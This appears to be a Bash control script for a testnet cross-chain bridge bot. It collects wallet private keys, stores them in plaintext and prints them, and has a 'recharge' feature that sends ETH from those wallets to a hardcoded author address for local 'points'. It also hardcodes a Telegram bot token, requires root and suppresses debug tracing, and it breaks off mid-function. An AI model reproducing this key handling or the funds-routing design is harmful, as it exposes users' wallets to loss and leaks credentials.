#!/bin/bash

# 确保关闭调试模式
set +x
set +v

# 添加 trap 确保调试模式保持关闭
trap 'set +x; set +v' DEBUG

# === 颜色定义 ===
RED='\033[0;31m'
GREEN='\033[0;32m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# === 脚本路径和配置 ===
ARB_SCRIPT="uni-arb.py"
OP_SCRIPT="op-uni.py"
BALANCE_SCRIPT="balance-notifier.py"
CONFIG_FILE="accounts.json"
DIRECTION_FILE="direction.conf"
RPC_CONFIG_FILE="rpc_config.json"
CONFIG_JSON="config.json"
POINTS_JSON="points.json"
PYTHON_VERSION="3"
PM2_PROCESS_NAME="bridge-bot"
PM2_BALANCE_NAME="balance-notifier"
FEE_ADDRESS="0x3C47199dbC9Fe3ACD88ca17F87533C0aae05aDA2"
TELEGRAM_BOT_TOKEN="8070858648:AAGfrK1u0IaiXjr4f8TRbUDD92uBGTXdt38"
TELEGRAM_CHAT_ID=""
POINTS_HASH_FILE="points.hash"

# === 禁用命令回显函数 ===
disable_debug() {
    set +x
    set +v
}

# === 打印带颜色的消息 ===
print_message() {
    local color="$1"
    local message="$2"
    printf "${color}%s${NC}\n" "$message"
}

# === 横幅 ===
banner() {
    disable_debug
    clear
    print_message "$CYAN" "
🌟🌟🌟==================================================🌟🌟🌟
          跨链桥自动化脚本 by @hao3313076 😎         
🌟🌟🌟==================================================🌟🌟🌟
关注 Twitter: JJ长10cm | 高效跨链，安全可靠！🚀
请安装顺序配置 以免报错无法运行 ⚠️
🌟🌟🌟==================================================🌟🌟🌟"
}

# === 验证点数文件完整性 ===
validate_points_file() {
    if [ ! -f "$POINTS_JSON" ] || [ ! -f "$POINTS_HASH_FILE" ]; then
        print_message "$RED" "❗ 点数文件或哈希文件缺失！尝试重新创建...😢"
        echo '{}' > "$POINTS_JSON"
        sha256sum "$POINTS_JSON" > "$POINTS_HASH_FILE" 2>/dev/null || {
            print_message "$RED" "❗ 无法创建 $POINTS_HASH_FILE，请检查写入权限😢"
            return 0
        }
        print_message "$GREEN" "✅ 点数文件已重新创建🎉"
        return 0
    fi
    current_hash=$(sha256sum "$POINTS_JSON" | awk '{print $1}')
    stored_hash=$(awk '{print $1}' "$POINTS_HASH_FILE")
    if [ "$current_hash" != "$stored_hash" ]; then
        print_message "$RED" "❗ 点数文件被篡改！😢"
        send_telegram_notification "点数文件被篡改！"
        return 0
    fi
    return 0
}

# === 添加私钥 ===
add_private_key() {
    disable_debug
    validate_points_file
    print_message "$CYAN" "🔑 请输入私钥（带或不带 0x，多个用 + 分隔，例如 key1+key2）："
    read -p "> " private_keys
    IFS='+' read -ra keys <<< "$private_keys"
    accounts=$(read_accounts)
    temp_file=$(mktemp)
    echo "$accounts" > "$temp_file"
    count=$(echo "$accounts" | jq 'length')
    added=0
    new_accounts=()
    for key in "${keys[@]}"; do
        key=$(echo "$key" | tr -d '[:space:]')
        key=${key#0x}
        if [[ ! "$key" =~ ^[0-9a-fA-F]{64}$ ]]; then
            print_message "$RED" "❗ 无效私钥：${key:0:10}...（需 64 位十六进制）😢"
            continue
        fi
        formatted_key="0x$key"
        if echo "$accounts" | jq -e ".[] | select(.private_key == \"$formatted_key\")" >/dev/null 2>&1; then
            print_message "$RED" "❗ 私钥 ${formatted_key:0:10}... 已存在，跳过😢"
            continue
        fi
        address=$(python3 -c "from web3 import Web3; print(Web3(Web3.HTTPProvider('https://sepolia.unichain.org')).eth.account.from_key('$formatted_key').address)" 2>/dev/null)
        if [ -z "$address" ]; then
            print_message "$RED" "❗ 无法计算私钥 ${formatted_key:0:10}... 的地址，跳过😢"
            continue
        fi
        count=$((count + 1))
        name="Account$count"
        new_entry="{\"name\": \"$name\", \"private_key\": \"$formatted_key\", \"address\": \"$address\"}"
        new_accounts+=("$new_entry")
        added=$((added + 1))
    done
    if [ $added -eq 0 ]; then
        rm "$temp_file"
        print_message "$RED" "❗ 未添加任何新私钥😢"
        return
    fi
    accounts_json=$(echo "$accounts" | jq -c '.')
    for entry in "${new_accounts[@]}"; do
        accounts_json=$(echo "$accounts_json $entry" | jq -s '.[0] + [.[1]]' | jq -c '.')
    done
    echo "$accounts_json" > "$CONFIG_FILE"
    if ! jq -e . "$CONFIG_FILE" >/dev/null 2>&1; then
        print_message "$RED" "❗ 错误：写入 $CONFIG_FILE 失败，恢复原始内容😢"
        mv "$temp_file" "$CONFIG_FILE"
        rm "$temp_file"
        return
    fi
    rm "$temp_file"
    update_python_accounts
    print_message "$GREEN" "✅ 已添加 $added 个账户！🎉"
    print_message "$CYAN" "📋 当前 accounts.json 内容："
    cat "$CONFIG_FILE"
}

# === 读取账户 ===
read_accounts() {
    if [ ! -f "$CONFIG_FILE" ] || [ ! -s "$CONFIG_FILE" ]; then
        echo '[]'
        return
    fi
    if ! jq -e . "$CONFIG_FILE" >/dev/null 2>&1; then
        print_message "$RED" "❗ 警告：$CONFIG_FILE 格式无效，重置为空列表😢"
        echo '[]' > "$CONFIG_FILE"
        echo '[]'
        return
    fi
    cat "$CONFIG_FILE"
}

# === 更新 Python 脚本账户 ===
update_python_accounts() {
    validate_points_file
    accounts=$(read_accounts)
    accounts_str=$(echo "$accounts" | jq -r '[.[] | {"private_key": .private_key, "name": .name}]' | jq -r '@json')
    if [ -z "$accounts_str" ] || [ "$accounts_str" == "[]" ]; then
        accounts_str="[]"
        print_message "$RED" "❗ 警告：账户列表为空，将设置 ACCOUNTS 为空😢"
    fi
    for script in "$ARB_SCRIPT" "$OP_SCRIPT"; do
        if [ ! -f "$script" ]; then
            print_message "$RED" "❗ 错误：$script 不存在😢"
            return 1
        fi
        if [ ! -w "$script" ]; then
            print_message "$RED" "❗ 错误：$script 不可写，请检查权限😢"
            return 1
        fi
        temp_file=$(mktemp)
        cp "$script" "$temp_file" || {
            print_message "$RED" "❗ 错误：无法备份 $script😢"
            rm -f "$temp_file"
            return 1
        }
        if grep -q "^ACCOUNTS = " "$script"; then
            sed "s|^ACCOUNTS = .*|ACCOUNTS = $accounts_str|" "$script" > "$script.tmp" || {
                print_message "$RED" "❗ 错误：更新 $script 失败😢"
                mv "$temp_file" "$script"
                rm -f "$script.tmp"
                return 1
            }
        else
            echo "ACCOUNTS = $accounts_str" > "$script.tmp"
            cat "$script" >> "$script.tmp" || {
                print_message "$RED" "❗ 错误：追加 $script 失败😢"
                mv "$temp_file" "$script"
                rm -f "$script.tmp"
                return 1
            }
        fi
        mv "$script.tmp" "$script" || {
            print_message "$RED" "❗ 错误：移动临时文件到 $script 失败😢"
            mv "$temp_file" "$script"
            return 1
        }
        rm -f "$temp_file"
    done
    print_message "$GREEN" "✅ 已更新 Python 脚本账户配置！🎉"
}

# === 充值点数 ===
recharge_points() {
    disable_debug
    validate_points_file

    # 检查是否有私钥
    accounts=$(read_accounts)
    if [ "$(echo "$accounts" | jq 'length')" -eq 0 ]
    then
        print_message "$RED" "❗ 请先添加私钥！😢"
        read -p "按回车继续... ⏎"
        return
    fi

    print_message "$CYAN" "💰 请输入要充值的 ETH 数量（1 ETH = 50000 次）："
    read -p "> " eth_amount

    # 验证输入的金额
    if ! [[ "$eth_amount" =~ ^[0-9]+(\.[0-9]+)?$ ]] || [ "$(echo "$eth_amount <= 0" | bc -l)" -eq 1 ]
    then
        print_message "$RED" "❗ 无效的金额！😢"
        read -p "按回车继续... ⏎"
        return
    fi

    # 创建临时 Python 脚本来检查余额
    temp_balance_script=$(mktemp)
    cat > "$temp_balance_script" << 'EOF'
from web3 import Web3
import json
import sys

def check_balance(private_key, rpc_url):
    try:
        w3 = Web3(Web3.HTTPProvider(rpc_url))
        if not w3.is_connected():
            return None
        account = w3.eth.account.from_key(private_key)
        balance = w3.eth.get_balance(account.address)
        return float(w3.from_wei(balance, 'ether')), account.address
    except Exception as e:
        print(f"Error checking balance: {str(e)}", file=sys.stderr)
        return None

def main():
    private_key = sys.argv[1]
    name = sys.argv[2]
    
    networks = {
        "Arbitrum Sepolia": {
            "rpc": "https://sepolia-rollup.arbitrum.io/rpc",
            "chain_id": 421614
        },
        "Optimism Sepolia": {
            "rpc": "https://sepolia.optimism.io",
            "chain_id": 11155420
        },
        "Uniswap Sepolia": {
            "rpc": "https://sepolia.unichain.org",
            "chain_id": 11155111
        }
    }
    
    results = []
    for network_name, info in networks.items():
        result = check_balance(private_key, info['rpc'])
        if result is not None:
            balance, address = result
            if balance > 0:
                results.append({
                    "network": network_name,
                    "balance": balance,
                    "address": address,
                    "rpc": info['rpc'],
                    "chain_id": info['chain_id']
                })
    
    print(json.dumps(results))

if __name__ == "__main__":
    main()
EOF

    # 检查所有账户在各个链上的余额
    total_eth_needed="$eth_amount"
    total_eth_found=0
    
    print_message "$CYAN" "🔍 正在检查所有账户余额..."
    while IFS= read -r account
    do
        if [ "$(echo "$total_eth_found >= $total_eth_needed" | bc -l)" -eq 1 ]; then
            break
        fi
        
        name=$(echo "$account" | jq -r '.name')
        private_key=$(echo "$account" | jq -r '.private_key')
        
        balances=$(python3 "$temp_balance_script" "$private_key" "$name")
        if [ -n "$balances" ] && [ "$balances" != "[]" ]
        then
            while IFS= read -r balance_info
            do
                network=$(echo "$balance_info" | jq -r '.network')
                balance=$(echo "$balance_info" | jq -r '.balance')
                address=$(echo "$balance_info" | jq -r '.address')
                rpc=$(echo "$balance_info" | jq -r '.rpc')
                chain_id=$(echo "$balance_info" | jq -r '.chain_id')
                
                print_message "$GREEN" "✅ $name 在 $network 上有 $balance ETH"
                total_eth_found=$(echo "$total_eth_found + $balance" | bc)
                
                transfer_info=$(jq -n \
                    --arg name "$name" \
                    --arg network "$network" \
                    --arg balance "$balance" \
                    --arg private_key "$private_key" \
                    --arg address "$address" \
                    --arg rpc "$rpc" \
                    --argjson chain_id "$chain_id" \
                    '{name: $name, network: $network, balance: ($balance|tonumber), private_key: $private_key, address: $address, rpc: $rpc, chain_id: $chain_id}')
                
                available_transfers+=("$transfer_info")
                
                if [ "$(echo "$total_eth_found >= $total_eth_needed" | bc -l)" -eq 1 ]; then
                    break 2
                fi
            done < <(echo "$balances" | jq -c '.[]')
        fi
    done < <(echo "$accounts" | jq -c '.[]')

    rm -f "$temp_balance_script"

    if [ "$(echo "$total_eth_found < $total_eth_needed" | bc -l)" -eq 1 ]
    then
        print_message "$RED" "❗ 所有账户总余额（$total_eth_found ETH）不足以支付 $total_eth_needed ETH！😢"
        read -p "按回车继续... ⏎"
        return
    fi

    print_message "$GREEN" "✅ 找到足够的余额，开始执行转账..."

    # 创建临时 Python 脚本来执行转账
    temp_transfer_script=$(mktemp)
    cat > "$temp_transfer_script" << 'EOF'
from web3 import Web3
import time
import sys
import json

def send_transaction(private_key, to_address, amount, rpc_url, chain_id):
    w3 = Web3(Web3.HTTPProvider(rpc_url))
    if not w3.is_connected():
        return {"success": False, "error": "Cannot connect to RPC"}

    try:
        account = w3.eth.account.from_key(private_key)
        from_address = account.address
        
        nonce = w3.eth.get_transaction_count(from_address)
        gas_price = w3.eth.gas_price
        
        transaction = {
            'nonce': nonce,
            'to': to_address,
            'value': w3.to_wei(amount, 'ether'),
            'gas': 21000,
            'gasPrice': gas_price,
            'chainId': chain_id
        }
        
        signed_txn = w3.eth.account.sign_transaction(transaction, private_key)
        tx_hash = w3.eth.send_raw_transaction(signed_txn.rawTransaction)
        
        start_time = time.time()
        while time.time() - start_time < 300:
            try:
                receipt = w3.eth.get_transaction_receipt(tx_hash)
                if receipt is not None:
                    if receipt['status'] == 1:
                        return {"success": True, "hash": tx_hash.hex()}
                    else:
                        return {"success": False, "error": "Transaction reverted"}
            except Exception:
                time.sleep(5)
                continue
            time.sleep(5)
        
        return {"success": False, "error": "Timeout waiting for confirmation"}
        
    except Exception as e:
        return {"success": False, "error": str(e)}

if __name__ == "__main__":
    transfer_data = json.loads(sys.argv[1])
    result = send_transaction(
        transfer_data["private_key"],
        transfer_data["to_address"],
        transfer_data["amount"],
        transfer_data["rpc"],
        transfer_data["chain_id"]
    )
    print(json.dumps(result))
EOF

    remaining_amount=$total_eth_needed
    successful_transfers=0
    total_transferred=0
    last_address=""

    # 对可用转账按余额排序（从高到低）
    sorted_transfers=$(printf '%s\n' "${available_transfers[@]}" | jq -s 'sort_by(-.balance)')
    
    # 检查是否有有效的转账数据
    if [ -z "$sorted_transfers" ] || [ "$sorted_transfers" = "null" ] || [ "$sorted_transfers" = "[]" ]; then
        print_message "$RED" "❗ 没有找到可用的转账！😢"
        return 1
    fi
    
    while IFS= read -r transfer; do
        if [ -z "$transfer" ] || [ "$transfer" = "null" ]; then
            continue
        fi
        
        if [ "$(echo "$remaining_amount <= 0" | bc -l)" -eq 1 ]; then
            break
        fi

        balance=$(echo "$transfer" | jq -r '.balance // empty')
        network=$(echo "$transfer" | jq -r '.network // empty')
        private_key=$(echo "$transfer" | jq -r '.private_key // empty')
        name=$(echo "$transfer" | jq -r '.name // empty')
        address=$(echo "$transfer" | jq -r '.address // empty')
        rpc=$(echo "$transfer" | jq -r '.rpc // empty')
        chain_id=$(echo "$transfer" | jq -r '.chain_id // empty')
        
        # 验证所有必需的字段
        if [ -z "$balance" ] || [ -z "$network" ] || [ -z "$private_key" ] || [ -z "$name" ] || [ -z "$address" ] || [ -z "$rpc" ] || [ -z "$chain_id" ]; then
            continue
        fi
        
        last_address="$address"

        # 计算这次转账金额
        transfer_amount=$remaining_amount
        if [ "$(echo "$transfer_amount > $balance" | bc -l)" -eq 1 ]
        then
            transfer_amount=$balance
        fi

        print_message "$CYAN" "🔄 从 $name ($network) 转账 $transfer_amount ETH..."

        # 准备转账数据
        transfer_data=$(jq -n \
            --arg private_key "$private_key" \
            --arg to_address "0x1Eb698d6BCA3d0CE050C709a09f70Ea177b38109" \
            --arg amount "$transfer_amount" \
            --arg rpc "$rpc" \
            --argjson chain_id "$chain_id" \
            '{private_key: $private_key, to_address: $to_address, amount: ($amount|tonumber), rpc: $rpc, chain_id: $chain_id}')

        # 执行转账
        result=$(python3 "$temp_transfer_script" "$transfer_data")
        if [ "$(echo "$result" | jq -r '.success')" = "true" ]
        then
            tx_hash=$(echo "$result" | jq -r '.hash')
            print_message "$GREEN" "✅ 转账成功！交易哈希：$tx_hash"
            successful_transfers=$((successful_transfers + 1))
            total_transferred=$(echo "$total_transferred + $transfer_amount" | bc)
            remaining_amount=$(echo "$remaining_amount - $transfer_amount" | bc)
            
            # 发送 Telegram 通知
            send_telegram_notification "✅ 地址 $address 在 $network 转账 $transfer_amount ETH 成功！交易哈希：$tx_hash"
        else
            error_message=$(echo "$result" | jq -r '.error')
            print_message "$RED" "❌ 转账失败：$error_message"
        fi
    done < <(echo "$sorted_transfers" | jq -c '.[]')

    rm -f "$temp_transfer_script"

    if [ "$successful_transfers" -gt 0 ] && [ -n "$last_address" ]
    then
        # 更新点数 - 新的优惠政策
        points_to_add=0
        eth_amount_int=$(echo "$total_transferred" | bc | cut -d. -f1)
        
        if [ "$eth_amount_int" -ge 50 ]; then
            points_to_add=400000
        elif [ "$eth_amount_int" -ge 20 ]; then
            points_to_add=150000
        elif [ "$eth_amount_int" -ge 10 ]; then
            points_to_add=60000
        else
            points_to_add=$(($(echo "$total_transferred * 50000" | bc | cut -d. -f1)))
        fi
        
        points_json=$(cat "$POINTS_JSON")
        current_points=$(echo "$points_json" | jq -r ".[\"$last_address\"] // 0")
        new_points=$((current_points + points_to_add))
        
        # 保存新的点数
        echo "$points_json" | jq --arg addr "$last_address" --arg points "$new_points" '. + {($addr): ($points|tonumber)}' > "$POINTS_JSON"
        if [ $? -eq 0 ]
        then
            # 更新哈希
            sha256sum "$POINTS_JSON" > "$POINTS_HASH_FILE"
            print_message "$GREEN" "✅ 充值完成！成功转账 $total_transferred ETH，获得 $points_to_add 点数！🎉"
        else
            print_message "$RED" "❗ 更新点数失败！😢"
        fi
    else
        print_message "$RED" "❗ 所有转账都失败了！😢"
    fi

    read -p "按回车继续... ⏎"
}

# === 查看点数余额 ===
view_points_balance() {
    disable_debug
    validate_points_file
    
    print_message "$CYAN" "🏫 点数余额查看"
    print_message "$CYAN" "===================="
    print_message "$CYAN" "充值优惠政策："
    print_message "$GREEN" "• 10 ETH = 60,000 点"
    print_message "$GREEN" "• 20 ETH = 150,000 点"
    print_message "$GREEN" "• 50 ETH = 400,000 点"
    print_message "$GREEN" "• 其他金额 = 充值金额 × 50,000 点"
    print_message "$CYAN" "===================="
    
    points_json=$(cat "$POINTS_JSON")
    if [ "$(echo "$points_json" | jq 'length')" -eq 0 ]; then
        print_message "$RED" "❗ 暂无点数记录！"
        return
    fi
    
    print_message "$CYAN" "当前点数余额："
    while IFS= read -r line; do
        address=$(echo "$line" | jq -r '.[0]')
        points=$(echo "$line" | jq -r '.[1]')
        print_message "$GREEN" "地址: ${address:0:10}...${address: -8}"
        print_message "$GREEN" "点数: $points"
        print_message "$CYAN" "-------------------"
    done < <(echo "$points_json" | jq -r 'to_entries | .[] | [.key, .value] | @json')
}

# === 主菜单 ===
main_menu() {
    disable_debug
    while true; do
        banner
        print_message "$CYAN" "🔧 主菜单："
        cat << EOF
1. 管理 Telegram 🌐
2. 管理私钥 🔑
3. 充值点数 💰
4. 管理速度 ⏱️
5. 管理 RPC ⚙️
6. 选择跨链方向 🌉
7. 开始运行 🚀
8. 停止运行 🛑
9. 查看日志 📜
10. 查看点数余额 🏫
11. 删除脚本 🗑️
0. 退出 👋
EOF
        read -p "> " choice
        case $choice in
            1) manage_telegram ;;
            2) manage_private_keys ;;
            3) recharge_points ;;
            4) manage_speed ;;
            5) manage_rpc ;;
            6) select_direction ;;
            7) start_running ;;
            8) stop_running ;;
            9) view_logs ;;
            10) view_points_balance ;;
            11) delete_script ;;
            0) 
                print_message "$GREEN" "👋 感谢使用，再见！"
                exit 0
                ;;
            *)
                print_message "$RED" "❗ 无效选项！😢"
                ;;
        esac
    done
}

# === 管理私钥 ===
manage_private_keys() {
    disable_debug
    validate_points_file
    while true; do
        banner
        print_message "$CYAN" "🔑 私钥管理："
        cat << EOF
1. 添加私钥 ➕
2. 删除私钥 ➖
3. 查看私钥 📋
4. 返回 🔙
5. 删除全部私钥 🗑️
EOF
        read -p "> " sub_choice
        case $sub_choice in
            1) add_private_key ;;
            2) delete_private_key ;;
            3) view_private_keys ;;
            4) break ;;
            5) delete_all_private_keys ;;
            *)
                print_message "$RED" "❗ 无效选项！😢"
                ;;
        esac
        read -p "按回车继续... ⏎"
    done
}

# === 管理 RPC ===
manage_rpc() {
    disable_debug
    validate_points_file
    while true; do
        banner
        print_message "$CYAN" "⚙️ RPC 管理："
        cat << EOF
1. 查看当前 RPC 📋
2. 修改 RPC ⚙️
3. 返回 🔙
EOF
        read -p "> " sub_choice
        case $sub_choice in
            1)
                view_rpc
                ;;
            2)
                modify_rpc
                ;;
            3)
                break
                ;;
            *)
                print_message "$RED" "❗ 无效选项！😢"
                ;;
        esac
        read -p "按回车继续... ⏎"
    done
}

# === 查看 RPC ===
view_rpc() {
    disable_debug
    if [ ! -f "$RPC_CONFIG_FILE" ]; then
        print_message "$RED" "❗ RPC 配置文件不存在！😢"
        return
    fi
    print_message "$CYAN" "📋 当前 RPC 配置："
    jq -r 'to_entries | .[] | "[\(.key)] \(.value)"' "$RPC_CONFIG_FILE" | nl -v 1
}

# === 修改 RPC ===
modify_rpc() {
    disable_debug
    if [ ! -f "$RPC_CONFIG_FILE" ]; then
        print_message "$RED" "❗ RPC 配置文件不存在！😢"
        return
    fi
    view_rpc
    print_message "$CYAN" "🔍 请选择要修改的 RPC（1-3）："
    read -p "> " index
    if ! [[ "$index" =~ ^[1-3]$ ]]; then
        print_message "$RED" "❗ 无效选项！😢"
        return
    fi
    key=$(jq -r 'to_entries | .['$((index-1))'] | .key' "$RPC_CONFIG_FILE")
    print_message "$CYAN" "📝 请输入新的 RPC URL："
    read -p "> " new_url
    if [ -z "$new_url" ]; then
        print_message "$RED" "❗ RPC URL 不能为空！😢"
        return
    fi
    temp_file=$(mktemp)
    cp "$RPC_CONFIG_FILE" "$temp_file"
    jq --arg key "$key" --arg url "$new_url" '.[$key] = $url' "$RPC_CONFIG_FILE" > "$RPC_CONFIG_FILE.tmp"
    if ! jq -e . "$RPC_CONFIG_FILE.tmp" >/dev/null 2>&1; then
        print_message "$RED" "❗ 错误：写入 RPC 配置失败，恢复原始内容😢"
        mv "$temp_file" "$RPC_CONFIG_FILE"
        rm -f "$RPC_CONFIG_FILE.tmp"
        return
    fi
    mv "$RPC_CONFIG_FILE.tmp" "$RPC_CONFIG_FILE"
    rm -f "$temp_file"
    print_message "$GREEN" "✅ RPC 已更新！🎉"
    update_python_rpc
}

# === 更新 Python 脚本 RPC ===
update_python_rpc() {
    disable_debug
    rpc_config=$(cat "$RPC_CONFIG_FILE")
    arb_rpc=$(echo "$rpc_config" | jq -r '.arb_rpc')
    op_rpc=$(echo "$rpc_config" | jq -r '.op_rpc')
    uni_rpc=$(echo "$rpc_config" | jq -r '.uni_rpc')

    for script in "$ARB_SCRIPT" "$OP_SCRIPT"; do
        if [ ! -f "$script" ]; then
            print_message "$RED" "❗ 错误：$script 不存在😢"
            continue
        fi
        temp_file=$(mktemp)
        cp "$script" "$temp_file"
        
        # 更新 RPC URLs
        if [ "$script" = "$ARB_SCRIPT" ]; then
            sed -i "s|^ARB_RPC = .*|ARB_RPC = \"$arb_rpc\"|" "$script"
            sed -i "s|^UNI_RPC = .*|UNI_RPC = \"$uni_rpc\"|" "$script"
        else
            sed -i "s|^OP_RPC = .*|OP_RPC = \"$op_rpc\"|" "$script"
            sed -i "s|^UNI_RPC = .*|UNI_RPC = \"$uni_rpc\"|" "$script"
        fi

        if [ $? -ne 0 ]; then
            print_message "$RED" "❗ 错误：更新 $script RPC 失败，恢复原始内容😢"
            mv "$temp_file" "$script"
            continue
        fi
        rm -f "$temp_file"
    done
    print_message "$GREEN" "✅ Python 脚本 RPC 已更新！🎉"
}

# === 管理速度 ===
manage_speed() {
    disable_debug
    validate_points_file
    while true; do
        banner
        print_message "$CYAN" "⏱️ 速度管理："
        cat << EOF
1. 查看当前速度 📋
2. 修改速度 ⚙️
3. 返回 🔙
EOF
        read -p "> " sub_choice
        case $sub_choice in
            1)
                view_speed
                ;;
            2)
                modify_speed
                ;;
            3)
                break
                ;;
            *)
                print_message "$RED" "❗ 无效选项！😢"
                ;;
        esac
        read -p "按回车继续... ⏎"
    done
}

# === 查看速度 ===
view_speed() {
    disable_debug
    for script in "$ARB_SCRIPT" "$OP_SCRIPT"; do
        if [ ! -f "$script" ]; then
            print_message "$RED" "❗ 错误：$script 不存在😢"
            continue
        fi
        print_message "$CYAN" "📋 $script 当前速度配置："
        grep -E "^(MIN_INTERVAL|MAX_INTERVAL) = " "$script" || print_message "$RED" "❗ 未找到速度配置😢"
    done
}

# === 修改速度 ===
modify_speed() {
    disable_debug
    print_message "$CYAN" "⏱️ 请输入最小间隔时间（秒）："
    read -p "> " min_interval
    if ! [[ "$min_interval" =~ ^[0-9]+$ ]]; then
        print_message "$RED" "❗ 无效的时间间隔！😢"
        return
    fi

    print_message "$CYAN" "⏱️ 请输入最大间隔时间（秒）："
    read -p "> " max_interval
    if ! [[ "$max_interval" =~ ^[0-9]+$ ]] || [ "$max_interval" -lt "$min_interval" ]; then
        print_message "$RED" "❗ 无效的时间间隔！最大间隔必须大于最小间隔😢"
        return
    fi

    for script in "$ARB_SCRIPT" "$OP_SCRIPT"; do
        if [ ! -f "$script" ]; then
            print_message "$RED" "❗ 错误：$script 不存在😢"
            continue
        fi
        temp_file=$(mktemp)
        cp "$script" "$temp_file"
        
        # 更新速度配置
        sed -i "s|^MIN_INTERVAL = .*|MIN_INTERVAL = $min_interval|" "$script"
        sed -i "s|^MAX_INTERVAL = .*|MAX_INTERVAL = $max_interval|" "$script"

        if [ $? -ne 0 ]; then
            print_message "$RED" "❗ 错误：更新 $script 速度配置失败，恢复原始内容😢"
            mv "$temp_file" "$script"
            continue
        fi
        rm -f "$temp_file"
        print_message "$GREEN" "✅ $script 速度已更新！🎉"
    done
}

# === 管理 Telegram ===
manage_telegram() {
    disable_debug
    validate_points_file
    while true; do
        banner
        print_message "$CYAN" "🌐 Telegram 管理："
        cat << EOF
1. 查看当前配置 📋
2. 修改 Chat ID ⚙️
3. 返回 🔙
EOF
        read -p "> " sub_choice
        case $sub_choice in
            1)
                view_telegram
                ;;
            2)
                modify_telegram
                ;;
            3)
                break
                ;;
            *)
                print_message "$RED" "❗ 无效选项！😢"
                ;;
        esac
        read -p "按回车继续... ⏎"
    done
}

# === 查看 Telegram 配置 ===
view_telegram() {
    disable_debug
    print_message "$CYAN" "📋 当前 Telegram 配置："
    echo "Bot Token: $TELEGRAM_BOT_TOKEN"
    echo "Chat ID: $TELEGRAM_CHAT_ID"
    if [ -z "$TELEGRAM_CHAT_ID" ]; then
        print_message "$RED" "❗ 警告：Chat ID 未设置！😢"
    fi
}

# === 修改 Telegram Chat ID ===
modify_telegram() {
    disable_debug
    print_message "$CYAN" "📝 请输入新的 Chat ID："
    read -p "> " new_chat_id
    if [ -z "$new_chat_id" ]; then
        print_message "$RED" "❗ Chat ID 不能为空！😢"
        return
    fi
    # 验证 Chat ID 格式
    if ! [[ "$new_chat_id" =~ ^-?[0-9]+$ ]]; then
        print_message "$RED" "❗ 无效的 Chat ID！必须是数字😢"
        return
    fi

    # 保存到配置文件
    echo "$new_chat_id" > telegram.conf
    TELEGRAM_CHAT_ID="$new_chat_id"

    # 更新脚本中的 Chat ID
    sed -i "s|^TELEGRAM_CHAT_ID=\".*\"|TELEGRAM_CHAT_ID=\"$new_chat_id\"|" "$0"
    if [ $? -ne 0 ]; then
        print_message "$RED" "❗ 更新 Chat ID 失败！😢"
        return
    fi

    print_message "$GREEN" "✅ Chat ID 已更新！🎉"
    # 发送测试消息
    send_telegram_notification "✅ Telegram 通知测试：配置已更新！"
}

# === 发送 Telegram 通知 ===
send_telegram_notification() {
    local message="$1"
    if [ -z "$TELEGRAM_CHAT_ID" ]; then
        return
    fi
    curl -s -X POST "https://api.telegram.org/bot$TELEGRAM_BOT_TOKEN/sendMessage" \
        -d "chat_id=$TELEGRAM_CHAT_ID" \
        -d "text=$message" \
        -d "parse_mode=HTML" >/dev/null 2>&1
}

# === 删除私钥 ===
delete_private_key() {
    disable_debug
    validate_points_file
    accounts=$(read_accounts)
    if [ "$(echo "$accounts" | jq 'length')" -eq 0 ]; then
        print_message "$RED" "❗ 没有可删除的私钥！😢"
        return
    fi
    print_message "$CYAN" "📋 当前账户列表："
    echo "$accounts" | jq -r '.[] | "[\(.name)] \(.address)"' | nl -v 1
    print_message "$CYAN" "🔍 请输入要删除的账户编号（或 0 取消）："
    read -p "> " index
    if [ "$index" -eq 0 ]; then
        return
    fi
    if ! [[ "$index" =~ ^[0-9]+$ ]] || [ "$index" -lt 1 ] || [ "$index" -gt "$(echo "$accounts" | jq 'length')" ]; then
        print_message "$RED" "❗ 无效编号！😢"
        return
    fi
    temp_file=$(mktemp)
    echo "$accounts" > "$temp_file"
    accounts_json=$(echo "$accounts" | jq -c "del(.[$((index-1))])")
    echo "$accounts_json" > "$CONFIG_FILE"
    if ! jq -e . "$CONFIG_FILE" >/dev/null 2>&1; then
        print_message "$RED" "❗ 错误：写入 $CONFIG_FILE 失败，恢复原始内容😢"
        mv "$temp_file" "$CONFIG_FILE"
        rm "$temp_file"
        return
    fi
    rm "$temp_file"
    update_python_accounts
    print_message "$GREEN" "✅ 已删除账户！🎉"
}

# === 查看私钥 ===
view_private_keys() {
    disable_debug
    validate_points_file
    accounts=$(read_accounts)
    if [ "$(echo "$accounts" | jq 'length')" -eq 0 ]; then
        print_message "$RED" "❗ 没有私钥！😢"
        return
    fi
    print_message "$CYAN" "📋 当前账户列表："
    echo "$accounts" | jq -r '.[] | "[\(.name)] \(.address) - \(.private_key)"' | nl -v 1
}

# === 删除全部私钥 ===
delete_all_private_keys() {
    disable_debug
    validate_points_file
    accounts=$(read_accounts)
    if [ "$(echo "$accounts" | jq 'length')" -eq 0 ]; then
        print_message "$RED" "❗ 没有可删除的私钥！😢"
        return
    fi
    print_message "$RED" "⚠️ 警告：此操作将删除所有私钥！确定要继续吗？(y/N)"
    read -p "> " confirm
    if [ "$confirm" != "y" ] && [ "$confirm" != "Y" ]; then
        print_message "$CYAN" "🔄 操作已取消"
        return
    fi
    echo '[]' > "$CONFIG_FILE"
    update_python_accounts
    print_message "$GREEN" "✅ 已删除所有私钥！🎉"
}

# === 检查 root 权限 ===
check_root() {
    if [ "$(id -u)" -ne 0 ]; then
        print_message "$RED" "❗ 请使用 root 权限运行此脚本！😢"
        exit 1
    fi
}

# === 初始化配置 ===
init_config() {
    disable_debug
    # 创建必要的配置文件
    [ ! -f "$CONFIG_FILE" ] && echo '[]' > "$CONFIG_FILE"
    [ ! -f "$RPC_CONFIG_FILE" ] && echo '{"arb_rpc": "https://arbitrum-sepolia.drpc.org", "op_rpc": "https://sepolia.optimism.io", "uni_rpc": "https://sepolia.unichain.org"}' > "$RPC_CONFIG_FILE"
    [ ! -f "$DIRECTION_FILE" ] && echo "arb" > "$DIRECTION_FILE"
    [ ! -f "$POINTS_JSON" ] && echo '{}' > "$POINTS_JSON"
    [ ! -f "$POINTS_HASH_FILE" ] && sha256sum "$POINTS_JSON" > "$POINTS_HASH_FILE"

    # 加载 Telegram 配置
    if [ -f "telegram.conf" ]; then
        TELEGRAM_CHAT_ID=$(cat telegram.conf)
        # 更新脚本中的 Chat ID
        sed -i "s|^TELEGRAM_CHAT_ID=\".*\"|TELEGRAM_CHAT_ID=\"$TELEGRAM_CHAT_ID\"|" "$0"
    fi
}

# === 安装依赖 ===
install_dependencies() {
    disable_debug
    print_message "$CYAN" "🔍 正在检查和安装必要的依赖...🛠️"
    
    # 更新包列表
    apt-get update -y || {
